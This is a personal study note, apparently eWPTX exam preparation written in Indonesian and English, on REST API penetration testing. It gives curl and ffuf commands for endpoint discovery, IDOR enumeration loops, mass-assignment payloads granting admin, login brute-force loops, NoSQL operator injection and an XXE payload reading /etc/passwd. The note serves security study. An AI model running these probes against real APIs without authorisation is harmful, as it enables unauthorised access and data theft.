2026-02-06

Status:

Tags: [[eWPTX]] [[Web Services]]
###### Prasyarat: [[REST (RESTful APIs)]]
# Pengujian Keamanan REST API

## Gambaran singkat

REST API mengekspos logic aplikasi via endpoint HTTP. Cara ngetesnya mirip web app testing, tapi biasanya ada vektor yang khas API (mis. IDOR/BOLA, mass assignment, token handling).

---

## Enumeration

### Discovering endpoints

```bash
# Directory brute-force for API paths
ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Common API paths to try
/api/v1/ /api/v2/ /api/v3/
/graphql /swagger.json /openapi.json
/api-docs /api/docs /.well-known/

# Check for Swagger/OpenAPI docs
curl https://target.com/swagger.json
curl https://target.com/v2/api-docs
```

### HTTP method probing

```bash
# Test all methods on an endpoint
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  curl -s -o /dev/null -w "%{http_code} $method\n" -X $method https://target.com/api/users
done
```

---

## BOLA / IDOR (Broken Object-Level Authorization)

Salah satu yang paling sering di API (OWASP API #1).

```bash
# Authenticated as user 1, try accessing user 2's data
curl -H "Authorization: Bearer TOKEN_USER1" https://target.com/api/users/2

# Test sequential IDs
for i in $(seq 1 100); do
  curl -s -H "Authorization: Bearer $TOKEN" https://target.com/api/users/$i | grep -v "403"
done

# Test with UUID — try predictable patterns or leaked IDs
```

**Yang dicari**: endpoint yang menerima object ID (user/order/file) lalu mengembalikan data tanpa verifikasi bahwa requester berhak atas object tersebut.

---

## Mass Assignment

Kirim field tambahan yang “seharusnya” tidak boleh di-set user:

```bash
# Normal user registration
curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123"}'

# Mass assignment attempt
curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123","role":"admin","isAdmin":true}'
```

Coba field privilege yang umum: `role`, `admin`, `isAdmin`, `is_staff`, `privilege`, `group`, `permissions`

---

## Authentication Testing

### Token analysis

```bash
# Check if token is validated at all
curl -H "Authorization: Bearer invalid_token" https://target.com/api/me

# Check if expired tokens are accepted
# Decode JWT, check exp claim vs current time

# Check if signature is validated (JWT none algorithm)
# See: [[The None Algorithm Vulnerability (JWT)]]
```

### Rate limiting

```bash
# Test for brute-force protection
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://target.com/api/login \
    -d '{"username":"admin","password":"attempt'$i'"}'
done
```

---

## Content-Type Juggling

Sebagian API menerima beberapa content-type, dan validasinya bisa berbeda-beda (ini sering jadi celah):

```bash
# JSON (expected)
curl -X POST https://target.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"query":"test"}'

# Try XML (may enable XXE)
curl -X POST https://target.com/api/data \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><query>&xxe;</query>'

# Try form-encoded
curl -X POST https://target.com/api/data \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'query=test'
```

---

## Verbose Error Exploitation

```bash
# Send malformed input to trigger stack traces
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"id": {"$gt": ""}}'

# Send wrong types
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"id": [1,2,3]}'
```

Cari: nama framework, tipe database, path internal, query SQL pada error message.

---

## Testing Methodology

1. **Map**: temukan semua endpoint, method, dan parameter
2. **Authenticate**: uji mekanisme auth (token, API key, session)
3. **Authorize**: uji BOLA/IDOR pada setiap object reference
4. **Input**: uji injection (SQLi/NoSQLi/command injection) di semua parameter
5. **Content-Type**: uji variasi content-type, XML injection, mass assignment
6. **Rate limit**: uji proteksi brute-force dan resource exhaustion
7. **Errors**: manfaatkan error verbose untuk info internal

---

## Tools

- **Postman**: Manual API testing and collection management
- **Burp Suite**: Proxy and scanner for API traffic
- **ffuf**: Endpoint and parameter fuzzing
- **Arjun**: Hidden parameter discovery
- **jwt_tool**: JWT testing and attacks
